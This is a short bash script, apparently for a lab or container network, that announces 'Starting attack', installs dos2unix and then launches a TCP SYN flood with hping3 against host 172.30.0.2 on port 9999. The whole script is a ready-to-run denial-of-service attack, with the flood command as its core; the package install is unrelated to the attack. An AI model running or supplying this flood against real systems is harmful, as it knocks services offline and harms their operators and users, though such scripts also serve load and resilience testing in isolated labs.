#!/bin/bash

TARGET="172.30.0.2"
PORT=9999

echo "Starting attack on $TARGET..."

apt-get update && apt-get install dos2unix -y

# Using the variable ensures the shell parses the string correctly
hping3 "$TARGET" -S --flood -p "$PORT"